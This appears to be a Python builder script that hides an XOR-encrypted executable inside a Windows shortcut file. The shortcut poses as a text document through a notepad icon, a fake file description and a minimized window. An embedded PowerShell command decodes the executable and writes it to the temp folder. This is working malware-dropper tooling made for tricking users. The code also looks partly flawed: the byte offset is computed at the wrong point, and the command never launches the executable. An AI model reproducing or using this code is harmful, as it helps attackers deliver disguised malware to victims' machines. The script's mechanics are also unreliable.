import os
import struct
import random

# XOR encryption key
XOR_KEY = 0x77

# Shell Link Header structure
SHELL_LINK_HEADER = (
    b"\x4C\x00\x00\x00"  # HeaderSize (76 bytes)
    b"\x01\x14\x02\x00\x00\x00\x00\x00\xC0\x00\x00\x00\x00\x00\x00\x46"  # LinkCLSID
    b"\xE4\x02\x00\x02"  # LinkFlags (HAS_NAME | HAS_ICON_LOCATION | HAS_ARGUMENTS | HAS_EXP_STRING | PREFER_ENVIRONMENT_PATH | IS_UNICODE)
    b"\x00\x00\x00\x00"  # FileAttributes
    b"\x00\x00\x00\x00\x00\x00\x00\x00"  # CreationTime
    b"\x00\x00\x00\x00\x00\x00\x00\x00"  # AccessTime
    b"\x00\x00\x00\x00\x00\x00\x00\x00"  # WriteTime
    b"\x00\x00\x00\x00"  # FileSize
    b"\x00\x00\x00\x00"  # IconIndex
    b"\x07\x00\x00\x00"  # ShowCommand (SW_SHOWMINNOACTIVE)
    b"\x00\x00"  # HotKey
    b"\x00\x00"  # Reserved1
    b"\x00\x00\x00\x00"  # Reserved2
    b"\x00\x00\x00\x00"  # Reserved3
)

# Link Flags
HAS_NAME = 0x00000004
HAS_ICON_LOCATION = 0x00000040
IS_UNICODE = 0x00000080
HAS_ARGUMENTS = 0x00002000
HAS_EXP_STRING = 0x00004000
PREFER_ENVIRONMENT_PATH = 0x00008000

def xor_encrypt(data, key):
    """XOR-encrypt data with the given key."""
    return bytes([b ^ key for b in data])

def create_lnk_file(exe_path, lnk_path, link_description, link_icon_path):
    """Create a .lnk file with an embedded XOR-encrypted executable."""
    # Read the target executable
    with open(exe_path, "rb") as exe_file:
        exe_data = exe_file.read()

    # XOR-encrypt the executable data
    encrypted_exe_data = xor_encrypt(exe_data, XOR_KEY)
    print(f"[DEBUG] XOR-encrypted EXE data (first 16 bytes): {encrypted_exe_data[:16].hex()}")

    # Create the .lnk file
    with open(lnk_path, "wb") as lnk_file:
        # Write the Shell Link Header
        lnk_file.write(SHELL_LINK_HEADER)

        # Write the description
        description_utf16 = link_description.encode("utf-16le")
        description_length = len(description_utf16) // 2  # Length in characters
        lnk_file.write(struct.pack("<H", description_length))  # Description length
        lnk_file.write(description_utf16)
        print(f"[DEBUG] Description: {link_description}")

        # Write the command-line arguments
        command_line_arguments = (
            ""   
            "/c powershell echo 1>t;$lp=gci " + lnk_path + ";"
            "$p=$env:temp+'\\'+(Get-Random)+'.exe';"
            "$f=gc $lp -Encoding Byte;for($i=0;$i -lt $f.count;$i++){$f[$i]=$f[$i] -bxor 0x77};"
            "set-content -Encoding Byte ($p,[byte[]]($f|select -Skip " + str(lnk_file.tell()) + "));"
        ).encode("utf-16le")
        command_line_arguments_length = len(command_line_arguments) // 2  # Length in characters
        lnk_file.write(struct.pack("<H", command_line_arguments_length))  # Command-line arguments length
        lnk_file.write(command_line_arguments)
        print(f"[DEBUG] Command-line arguments: {command_line_arguments.decode('utf-16le', errors='ignore')}")

        # Write the icon location
        icon_location_utf16 = link_icon_path.encode("utf-16le")
        icon_location_length = len(icon_location_utf16) // 2  # Length in characters
        lnk_file.write(struct.pack("<H", icon_location_length))  # Icon location length
        lnk_file.write(icon_location_utf16)
        print(f"[DEBUG] Icon location: {link_icon_path}")

        # Write the Environment Variable Data Block
        environment_variable_data_block = struct.pack("<II", 0x00000314, 0xA0000001)  # BlockSize and BlockSignature
        environment_variable_data_block += "c:\\windows\\system32\\cmd.exe".encode("utf-8").ljust(260, b"\x00")  # szTargetAnsi
        environment_variable_data_block += "c:\\windows\\system32\\cmd.exe".encode("utf-16le").ljust(520, b"\x00")  # wszTargetUnicode
        lnk_file.write(environment_variable_data_block)
        print(f"[DEBUG] Environment Variable Data Block written")

        # Write the encrypted executable data
        lnk_file.write(encrypted_exe_data)

        # Calculate the total LNK file size
        total_lnk_file_size = lnk_file.tell()
        print(f"[DEBUG] Total LNK file size: {total_lnk_file_size} bytes")

    print(f"Created .lnk file: {lnk_path}")

if __name__ == "__main__":
    import sys

    if len(sys.argv) != 3:
        print("Usage: python create_lnk.py <exe_path> <output_lnk_path>")
        sys.exit(1)

    exe_path = sys.argv[1]
    lnk_path = sys.argv[2]
    link_description = "Type: Text Document\nSize: 5.23 KB\nDate modified: 01/02/2020 11:23"
    link_icon_path = "%windir%\\system32\\notepad.exe"

    if not os.path.exists(exe_path):
        print(f"Error: File '{exe_path}' not found.")
        sys.exit(1)

    create_lnk_file(exe_path, lnk_path, link_description, link_icon_path)
